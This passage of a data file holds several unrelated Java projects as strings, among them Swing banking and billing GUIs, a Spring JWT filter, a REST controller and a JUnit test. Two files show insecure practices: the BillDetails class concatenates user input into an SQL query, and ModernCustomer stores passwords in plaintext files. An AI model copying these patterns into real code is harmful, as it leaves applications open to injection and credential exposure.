connection.setRequestProperty(\"Content-Type\", \"application/json\");\n\n                    // 4. Prepare the request body (if needed)\n                    String postData = \"{ \\\"key1\\\": \\\"value1\\\", \\\"key2\\\": \\\"value2\\\" }\"; // Example JSON\n                    try (OutputStream os = connection.getOutputStream()) {\n                        os.write(postData.getBytes());\n                    }\n\n                    // 5. Get the response code\n                    int responseCode = connection.getResponseCode();\n                    System.out.println(\"Response Code: \" + responseCode);\n\n                    // 6. Process the response (if needed)\n                    if (responseCode == 200 || responseCode == 201) { // Success codes\n                        // Read response using InputStream from connection\n                    } else {\n                        // Handle error\n                    }\n\n                } catch (Exception ex) {\n                    // Handle exceptions (e.g., network errors)\n                    ex.printStackTrace();\n                }\n\n                Window window = SwingUtilities.getWindowAncestor(loginButton);\n                if (window != null) {\n                    window.dispose();\n                }\n                new HomeWindowIsLoginClient(userNameField.getText());\n            }\n        });\n        \n        // Main Panel\n        JPanel mainPanel = new JPanel();\n        mainPanel.setLayout(new GridLayout(7, 1));\n        mainPanel.add(namePanel);\n        mainPanel.add(u",
    "package coe528.project;\r\n\r\nimport java.io.File;\r\nimport java.io.FileWriter;\r\nimport java.io.IOException;\r\n\r\n//Krunal Patel 501175325\r\n//Manages a customer's bank account and operations like deposits, withdrawals, and online purchases. Mutable.\r\npublic class ModernCustomer {\r\n    private String username;\r\n    private String password;\r\n    private ModernBankAccount account;\r\n    private String customerRole = \"customer\";\r\n\r\n    public ModernCustomer(String username, String password, double initialBalance, String customerRole){\r\n        this.username = username;\r\n        this.password = password;\r\n        this.account = new ModernBankAccount(determineAccountLevel(initialBalance)){};\r\n        this.account.updateBalance(initialBalance);\r\n        createOrUpdateCustomerFile(true);\r\n    }\r\n    \r\n    //Determines the correct AccountState based on the balance\r\n    private AccountState determineAccountLevel(double balance){\r\n        if (balance < 10000){\r\n            return new Silver();\r\n        } else if (balance >= 10000 && balance < 20000){\r\n            return new Gold();\r\n        } else{\r\n            return new Platinum();\r\n        }\r\n    }\r\n\r\n    //Methods below to interact with the account through its state\r\n    public void depositMoney(double amount) {\r\n        this.account.deposit(amount);\r\n        updateAccountLevel();\r\n        createOrUpdateCustomerFile(false);\r\n    }\r\n\r\n    public void withdrawMoney(double amount){\r\n        this.account.withdraw(amount);\r\n        updateAccountLevel();\r\n        createOrUpdateCustomerFile(false);\r\n    }\r\n    \r\n    //Attempts an online purchase\r\n    public void attemptOnlinePurchase(double amount){\r\n        this.account.executeOnlinePurchase(amount);\r\n        updateAccountLevel();\r\n        createOrUpdateCustomerFile(false);\r\n    }\r\n\r\n    //Updates the account's state based on the current balance\r\n    private void updateAccountLevel(){\r\n        AccountState newState = determineAccountLevel(this.account.checkBalance());\r\n        if (!newState.getClass().equals(this.account.getAccountState().getClass())){\r\n            this.account.setAccountState(newState); \r\n        }\r\n    }\r\n\r\n    private void createOrUpdateCustomerFile(boolean isNewCustomer){\r\n        try{\r\n            File file = new File(username + \".txt\");\r\n            if (isNewCustomer) file.createNewFile();\r\n            try (FileWriter writer = new FileWriter(file, false)){\r\n                writer.write(username + \"\\n\" + password + \"\\n\" + customerRole + \"\\n\" + account.checkBalance() + \"\\n\" + account.describeAccountType());\r\n            }\r\n        } catch (IOException e) {\r\n            System.out.println(\"An error occurred while creating/updating the customer file: \" + e.getMessage());\r\n        } \r\n    }\r\n\r\n    //Getters for username, password, and balance\r\n    public String getUsername(){return username;}\r\n    public String getPassword(){return password;}\r\n    public double getAccountBalance(){return this.account.checkBalance();}\r\n    public ModernBankAccount getAccount(){\r\n        return account;\r\n    }\r\n}\r\n",
    "package Electricity;\n\nimport net.proteanit.sql.DbUtils;\n\nimport javax.swing.*;\nimport java.awt.*;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class BillDetails extends JFrame {\n    JTable t1;\n    String x[]= {\"Meter Number\",\"Month\",\"Units\",\"Total Bill\",\"Status\"};\n    String y[][]= new String[40][8];\n    int i = 0,j=0;\n\n    BillDetails(String meter){\n        super(\"Bill Details\");\n        setSize(700,650);\n        setLocation(600,150);\n        setLayout(null);\n        getContentPane().setBackground(Color.white);\n\n        t1 = new JTable(y,x);\n        try{\n            Conn conn = new Conn();\n            String s1 = \"select * from bill where meter = \"+ meter;\n            ResultSet resultSet = conn.statement.executeQuery(s1);\n            t1.setModel(DbUtils.resultSetToTableModel(resultSet));\n        } catch (SQLException e) {\n            e.printStackTrace();\n            throw new RuntimeException(e);\n        }\n\n        JScrollPane scrollPane = new JScrollPane(t1);\n        scrollPane.setBounds(0,0,700,650);\n        add(scrollPane);\n    }\n    public  static  void main(String [] args){\n        new BillDetails(\"\").setVisible(true);\n    }\n}\n",
    "import java.util.Arrays;\nimport java.util.InputMismatchException;\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Database db = new Database();\n        Perceptron perceptron = new Perceptron(Arrays.asList(0.2, 0.2, 0.2, 0.2, 0d), 0.3);\n        Trainer trainer = new Trainer(perceptron, db);\n        Scanner scanner = new Scanner(System.in);\n        String class1 = \"Iris-setosa\";\n        String class2 = \"Iris-virginica\";\n\n        db.loadMainData(class1, class2);\n        System.out.println(\"do you want to predict spec from your inserted data? [y/n]\");\n        String choose = scanner.nextLine();\n        boolean isRunning = false;\n        while (!choose.equals(\"y\") && !choose.equals(\"n\")) {\n            System.out.println(\"unknown command\");\n            System.out.println(\"do you want to predict spec from your inserted data? [y/n]\");\n            choose = scanner.nextLine();\n        }\n\n        trainer.train();\n        if (choose.equals(\"n\")) {\n            perceptron.computeTestingData(db.getTestingData());\n            perceptron.computeUserData(db.getUserData());\n        }\n\n        if (choose.equals(\"y\")) isRunning = true;\n        while (isRunning) {\n            System.out.println(\"=======================================================================================\");\n            System.out.println(\"\\t\\t\\t\\t\\t\\t\\tCOMPUTING INPUT DATA\");\n            System.out.println(\"=======================================================================================\");\n            Double sepal_length;\n            Double sepal_width;\n            Double petal_length;\n            Double petal_width;\n            do {\n                try {\n                    System.out.println(\"insert sepal_length\");\n                    sepal_length = scanner.nextDouble();\n                    System.out.println(\"insert sepal_width\");\n                    sepal_width = scanner.nextDouble();\n                    System.out.println(\"insert petal_length\");\n                    petal_length = scanner.nextDouble();\n                    System.out.println(\"insert petal_width\");\n                    petal_width = scanner.nextDouble();\n                } catch (InputMismatchException e) {\n                    System.err.println(\"INCORRECT NUMBER FORMAT\");\n                    scanner.nextLine();\n                    continue;\n                }\n                break;\n            } while (true);\n\n            db.loadInputData(sepal_length, sepal_width, petal_length, petal_width);\n            perceptron.computeInputData(db.getInputData(), class1, class2);\n            System.out.println();\n            System.out.println(\"do you want to predict more species? [y/n]\");\n            choose = scanner.next();\n            while(!choose.equals(\"y\") && !choose.equals(\"n\")){\n                System.out.println(\"unknown command\");\n                System.out.println(\"do you want to predict spec from your inserted data? [y/n]\");\n                choose = scanner.nextLine();\n            }\n            if (choose.equals(\"n\"))\n                isRunning = false;\n        }\n    }\n\n}",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n\n/**\n *\n * @author mo100\n */\npublic class AboutFrame extends javax.swing.JFrame {\n    private Bank bank;\n    /**\n     * Creates new form AboutFrame\n     */\n    public AboutFrame(Bank bank) {\n        setResizable(false);\n        initComponents();\n        this.bank = bank;\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        returnButton = new javax.swing.JButton();\n        jLabel1 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        returnButton.setText(\"Go Back\");\n        returnButton.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                returnButtonActionPerformed(evt);\n            }\n        });\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI Emoji\", 1, 18)); // NOI18N\n        jLabel1.setText(\"My name is Mo, and I am determined to show my coding skills!\");\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n            .addGroup(layout.createSequentialGroup()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(layout.createSequentialGroup()\n                        .addContainerGap()\n                        .addComponent(jLabel1))\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(14, 14, 14)\n                        .addComponent(returnButton)))\n                .addGap(0, 0, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                .addGap(35, 35, 35)\n                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 205, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 58, Short.MAX_VALUE)\n                .addComponent(returnButton)\n                .addGap(15, 15, 15))\n        );\n\n        pack();\n    }// </editor-fold>//GEN-END:initComponents\n\n    private void returnButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_returnButtonActionPerformed\n        // TODO add your handling code here:\n        setVisible(false);\n        bank.wlcmf.setVisible(true);\n    }//GEN-LAST:event_returnButtonActionPerformed\n\n\n    // Variables declaration - do not modify//GEN-BEGIN:variables\n    private javax.swing.JLabel jLabel1;\n    private javax.swing.JButton returnButton;\n    // End of variables declaration//GEN-END:variables\n}\n",
    "package com.simpleroles.simpleroles;\n\nimport com.simpleroles.simpleroles.Commands.*;\nimport com.simpleroles.simpleroles.Listeners.MenuHandler;\nimport com.simpleroles.simpleroles.Listeners.PlayerJoin;\nimport com.simpleroles.simpleroles.sql.MySQL;\nimport com.simpleroles.simpleroles.sql.QueryManager;\nimport org.bukkit.Bukkit;\nimport org.bukkit.plugin.java.JavaPlugin;\n\nimport java.sql.SQLException;\n\npublic final class Main extends JavaPlugin {\n    public static MySQL sql;\n\n    @Override\n    public void onEnable() {\n        CustomConfig.setup();\n        CustomConfig.get().options().copyDefaults(true);\n        CustomConfig.save();\n\n        sql = new MySQL();\n\n        try {\n            sql.connect();\n        } catch (ClassNotFoundException | SQLException e) {\n            Bukkit.getLogger().info(\"Could not connect to MySQL database.\");\n        }\n\n        if (sql.isConnected()) {\n            Bukkit.getLogger().info(\"Connected to MySQL database.\");\n        }\n\n        QueryManager.createInitialTables();\n\n        getServer().getPluginManager().registerEvents(new PlayerJoin(), this);\n        getServer().getPluginManager().registerEvents(new MenuHandler(), this);\n\n        getCommand(\"rolecreate\").setExecutor(new RoleCreate());\n        getCommand(\"roledelete\").setExecutor(new RoleDelete());\n        getCommand(\"roleassign\").setExecutor(new RoleAssign());\n        getCommand(\"roleremove\").setExecutor(new RoleRemove());\n        getCommand(\"rolelist\").setExecutor(new RoleList());\n    }\n\n    @Override\n    public void onDisable() {\n        sql.disconnect();\n    }\n\n    public static MySQL getSQL() {\n        return sql;\n    }\n}\n",
    "package com.chaos.filter;\n\nimport com.alibaba.fastjson.JSON;\nimport com.chaos.constant.AppHttpCodeEnum;\nimport com.chaos.constant.LoginConstant;\nimport com.chaos.entity.LoginUser;\nimport com.chaos.response.ResponseResult;\nimport com.chaos.util.JwtUtil;\nimport com.chaos.util.RedisCache;\nimport com.chaos.util.WebUtils;\nimport io.jsonwebtoken.Claims;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.StringUtils;\nimport org.springframework.web.filter.OncePerRequestFilter;\n\nimport javax.servlet.FilterChain;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.Objects;\n\n@Component\npublic class JwtAuthenticationTokenFilter extends OncePerRequestFilter {\n    @Autowired\n    private RedisCache redisCache;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {\n        //\u83b7\u53d6\u8bf7\u6c42\u5934\u4e2d\u7684token\n        String token = request.getHeader(\"access_token\");\n        if (!StringUtils.hasText(token)) {\n            //\u8bf4\u660e\u8be5\u63a5\u53e3\u4e0d\u9700\u8981\u767b\u5f55\uff0c\u76f4\u63a5\u653e\u884c\n            filterChain.doFilter(request, response);\n            return;\n        }\n        Claims claims = null;\n        //\u89e3\u6790\u83b7\u53d6userid\n        try {\n            claims = JwtUtil.parseShortToken(token);\n        } catch (Exception e) {\n            e.printStackTrace();\n            //token\u8d85\u65f6 token\u975e\u6cd5\n            //\u54cd\u5e94\u544a\u8bc9\u524d\u7aef\u9700\u8981\u91cd\u65b0\u767b\u5f55\u6216\u8005\u91cd\u65b0\u83b7\u53d6assessToken\n            ResponseResult result = ResponseResult.errorResult(AppHttpCodeEnum.TOKEN_EXPIRED);\n            WebUtils.renderString(response, JSON.toJSONString(result));\n            return;\n        }\n        String userKey = claims.getSubject();\n        //\u4eceredis\u4e2d\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n        LoginUser loginUser = JSON.parseObject(redisCache.getCacheObject(\n                userKey), LoginUser.class);\n        //\u5982\u679c\u83b7\u53d6\u4e0d\u5230\n        if (Objects.isNull(loginUser)) {\n            //\u8bf4\u660e\u767b\u5f55\u8fc7\u671f  \u63d0\u793a\u91cd\u65b0\u767b\u5f55\n            ResponseResult result = ResponseResult.errorResult(AppHttpCodeEnum.NEED_LOGIN);\n            WebUtils.renderString(response, JSON.toJSONString(result));\n            return;\n        }\n        //\u5b58\u5165SecurityContextHolder\n        UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, null);\n        SecurityContextHolder.getContext().setAuthentication(authenticationToken);\n\n        filterChain.doFilter(request, response);\n    }\n}\n",
    "package br.com.douglas.kol.controller;\n\nimport br.com.douglas.kol.dto.pizza.DadosAtualizacaoPizza;\nimport br.com.douglas.kol.dto.pizza.DadosCadastroPizza;\nimport br.com.douglas.kol.dto.pizza.DadosDetalhamentoPizza;\nimport br.com.douglas.kol.dto.pizza.DadosListagemPizza;\nimport br.com.douglas.kol.service.PizzaService;\nimport jakarta.validation.Valid;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.data.domain.Page;\nimport org.springframework.data.domain.Pageable;\nimport org.springframework.data.web.PageableDefault;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.util.UriComponentsBuilder;\n\nimport javax.transaction.Transactional;\n\n@RestController\n@RequestMapping(\"/pizza\")\npublic class PizzaController {\n\n    @Autowired\n    private PizzaService service;\n\n    @PostMapping(\"/adiciona\")\n    @Transactional\n    public ResponseEntity adiciona(@RequestBody @Valid DadosCadastroPizza dados,\n                                   UriComponentsBuilder uriBuilder){\n        DadosDetalhamentoPizza pizza = service.salvar(dados);\n\n        var uri = uriBuilder.path(\"/pizza/{id}\").buildAndExpand(pizza.id()).toUri();\n\n        return ResponseEntity.created(uri).body(pizza);\n    }\n\n    @CrossOrigin\n    @GetMapping(\"/listar\")\n    public ResponseEntity<Page<DadosListagemPizza>> lista(@PageableDefault(size = 6 ,sort = \"nome\")\n                                                              Pageable paginacao){\n    Page<DadosListagemPizza> listagemPizzas = service.listar(paginacao);\n\n    return ResponseEntity.ok(listagemPizzas);\n    }\n\n    @PutMapping(\"/atualizar\")\n    public ResponseEntity atualiza(@RequestBody @Valid DadosAtualizacaoPizza dados){\n    DadosDetalhamentoPizza atualiza = service.atualiza(dados);\n    return ResponseEntity.ok(atualiza);\n    }\n\n    @DeleteMapping (\"/{id}\")\n    public  ResponseEntity deleta(@PathVariable Long id){\n        service.excluir(id);\n        return ResponseEntity.noContent().build();\n    }\n\n}\n",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise10Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        this.outContent.reset();\n        this.errContent.reset();\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n\n    @Test\n    @DisplayName(\"Check ball color\")\n    void testGetBall() {\n        String colorBall = Exercise10.getBall();\n        List<String> colorList = new ArrayList<>(List.of(\"rojo\", \"azul\", \"verde\"));\n        assertTrue(colorList.contains(colorBall), \"Ball color is not allowed\");\n    }\n\n    @Test\n    @DisplayName(\"Check if can obtain 2 blue balls\")\n    void testGet2BlueBalls() {\n        Exercise10.main(new String[0]);\n        String ballColor = \"azul\";\n        int counter = 0;\n        int index = outContent.toString().indexOf(ballColor);\n        while (index != -1) {\n            counter++;\n            index = outContent.toString().indexOf(ballColor, index + 1);\n        }\n        assertEquals(2, counter);\n\n    }\n}",
    "package vetorrrr;\n\npublic class vetorrrrr {\n    private String nome;\n    private int idade;\n    private char sexo;\n\n    public vetorrrrr(String nome,int idade,char sexo){\n        this.nome=nome;\n        this.idade=idade;\n        this.sexo=sexo;\n    }\n    public void carregar(String nome,int idade){\n        this.nome=nome;\n        this.idade=idade;\n    }\n    public void carregar(String nome,int idade,char sexo){\n        this.carregar(nome, idade);\n        this.sexo=sexo;\n    }\n\n    public void setNome(String nome) {\n        this.nome = nome;\n    }\n\n    public void setIdade(int idade) {\n        this.idade = idade;\n    }\n\n    public void setSexo(char sexo) {\n        this.sexo = sexo;\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public int getIdade() {\n        return idade;\n    }\n\n    public char getSexo() {\n        return sexo;\n    }\n}\n\npackage eita;\n\nimport vetorrrr.vetorrrrr;\n\nimport java.util.Scanner;\n\npublic class vito {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        vetorrrrr[] vetorzin= new vetorrrrr[4];\n\n        for (int i = 0; i < vetorzin.length; i++) {\n            System.out.println(\"Nomes:\"+(i+1));\n            System.out.println(\"Digite seu nome:\");\n            String nome= ler.nextLine();\n            System.out.println(\"Digite sua idade:\");\n            int idade= ler.nextInt();\n            System.out.println(\"Digite seu sexo:\");\n            char sexo= ler.next().charAt(0);\n            ler.nextLine();\n            vetorzin[i]=new vetorrrrr(nome,idade,sexo);\n        }\n        for (int i = 0; i < vetorzin.length; i++) {\n            System.out.println(vetorzin[i].getNome()+\",\"+vetorzin[i].getIdade()+\",\"+vetorzin[i].getSexo());\n        }\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage com.shajib.phonebook_project;\n\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\nimport javax.swing.JOptionPane;\n\n/**\n *\n * @author user\n */\npublic class ResetUI extends javax.swing.JFrame {\n\n    /**\n     * Creates new form ResetUI\n     */\n    public ResetUI() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        pass = new javax.swing.JPasswordField();\n        conPass = new javax.swing.JPasswordField();\n        ok = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBackground(new java.awt.Color(0, 102, 102));\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel1.setText(\"New Password           :\");\n\n        jLabel2.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel2.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel2.setText(\"Confirm Password     :\");\n\n        ok.setBackground(new java.awt.Color(0, 255, 0));\n        ok.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        ok.setText(\"OK\");\n        ok.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                okActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGap(23, 23, 23)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                    .addComponent(ok)\n                    .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                        .addGroup(jPanel1Layout.createSequentialGroup()\n                            .addComponent(jLabel2)\n                            .addGap(18, 18, 18)\n                            .addComponent(conPass, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE))\n                        .addGroup(jPanel1Layout.createSequentialGroup()\n                            .addComponent(jLabel1)\n                            .addGap(18, 18, 18)\n                            .addComponent(pass, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE))))\n                .addContainerGap(35, Short.MAX_VALUE))\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()\n                .addContainerGap(35, Short.MAX_VALUE)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(pass, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(conPass, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addComponent(ok, javax.swing.GroupLayout.PREFERRED_SIZE, 19, javax.swing.GroupLayout.PREFERRED_SIZE)\n                .addGap(26, 26, 26))\n        );\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swi",
    "package com.cai.dating.model.domain;\n\nimport com.baomidou.mybatisplus.annotation.*;\nimport lombok.Data;\n\nimport java.io.Serializable;\nimport java.util.Date;\n\n/**\n * \u961f\u4f0d\u5b9e\u4f53\n *\n *\n */\n@TableName(value = \"team\")\n@Data\npublic class Team implements Serializable {\n    /**\n     * id\n     */\n    @TableId(type = IdType.AUTO)\n    private Long id;\n\n    /**\n     * \u961f\u4f0d\u540d\u79f0\n     */\n    private String name;\n\n    /**\n     * \u63cf\u8ff0\n     */\n    private String description;\n\n    /**\n     * \u6700\u5927\u4eba\u6570\n     */\n    private Integer maxNum;\n\n    /**\n     * \u8fc7\u671f\u65f6\u95f4\n     */\n    private Date expireTime;\n\n    /**\n     * \u7528\u6237id\n     */\n    private Long userId;\n\n    /**\n     * 0 - \u516c\u5f00\uff0c1 - \u79c1\u6709\uff0c2 - \u52a0\u5bc6\n     */\n    private Integer status;\n\n    /**\n     * \u5bc6\u7801\n     */\n    private String password;\n\n    /**\n     * \u521b\u5efa\u65f6\u95f4\n     */\n    private Date createTime;\n\n    /**\n     *\n     */\n    private Date updateTime;\n\n    /**\n     * \u662f\u5426\u5220\u9664\n     */\n    @TableLogic\n    private Integer isDelete;\n\n    @TableField(exist = false)\n    private static final long serialVersionUID = 1L;\n}",
    "\nimport javax.swing.JOptionPane;\nimport javax.swing.table.DefaultTableModel;\n\n\npublic class Tela_de_Vendas extends javax.swing.JInternalFrame {\n   \n    public Tela_de_Vendas() {\n        initComponents();\n    }\n\n   \n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        camponome = new javax.swing.JTextField();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        campocpf = new javax.swing.JFormattedTextField();\n        campodata = new javax.swing.JFormattedTextField();\n        jPanel2 = new javax.swing.JPanel();\n        jLabel5 = new javax.swing.JLabel();\n        camponomeproduto = new javax.swing.JTextField();\n        jLabel6 = new javax.swing.JLabel();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        campoquantidade = new javax.swing.JTextField();\n        campocodigo = new javax.swing.JFormattedTextField();\n        jButton1 = new javax.swing.JButton();\n        jButton2 = new javax.swing.JButton();\n        campopreco = new javax.swing.JTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        carrinho = new javax.swing.JTable();\n        jPanel3 = new javax.swing.JPanel();\n        jLabel11 = new javax.swing.JLabel();\n        campototal = new javax.swing.JTextField();\n        jButton3 = new javax.swing.JButton();\n        jButton4 = new javax.swing.JButton();\n        jLabel9 = new javax.swing.JLabel();\n        jLabel10 = new javax.swing.JLabel();\n        jLabel12 = new javax.swing.JLabel();\n\n        setClosable(true);\n        setIconifiable(true);\n        setMaximizable(true);\n        setResizable(true);\n\n        jPanel1.setBackground(new java.awt.Color(255, 255, 255));\n\n        jLabel1.setFont(new java.awt.Font(\"Arial\", 1, 24)); // NOI18N\n        jLabel1.setText(\"Sistema de Vendas\");\n\n        jLabel2.setText(\"Nome do Cliente\");\n\n        jLabel3.setText(\"CPF\");\n\n        jLabel4.setText(\"Data da Compra\");\n\n        try {\n            campocpf.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing.text.MaskFormatter(\"###.###.###-##\")));\n        } catch (java.text.ParseException ex) {\n            ex.printStackTrace();\n        }\n\n        try {\n            campodata.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing.text.MaskFormatter(\"##/##/####\")));\n        } catch (java.text.ParseException ex) {\n            ex.printStackTrace();\n        }\n\n        jPanel2.setBackground(new java.awt.Color(102, 102, 102));\n\n        jLabel5.setText(\"Nome\");\n\n        jLabel6.setText(\"Quantidade\");\n\n        jLabel7.setText(\"Pre\u00e7o\");\n\n        jLabel8.setText(\"C\u00f3digo\");\n\n        try {\n            campocodigo.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing.text.MaskFormatter(\"########\")));\n        } catch (java.text.ParseException ex) {\n            ex.printStackTrace();\n        }\n\n        jButton1.setText(\"Adicionar\");\n        jButton1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton1ActionPerformed(evt);\n            }\n        });\n\n        jButton2.setText(\"Limpar\");\n        jButton2.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton2ActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addComponent(jLabel6)\n                    .addComponent(jLabel5)\n                    .addComponent(jLabel7)\n                    .addComponent(jLabel8))\n                .addGap(18, 18, 18)\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(camponomeproduto)\n                    .addComponent(campoquantidade)\n                    .addComponent(campocodigo)\n                    .addComponent(campopreco, 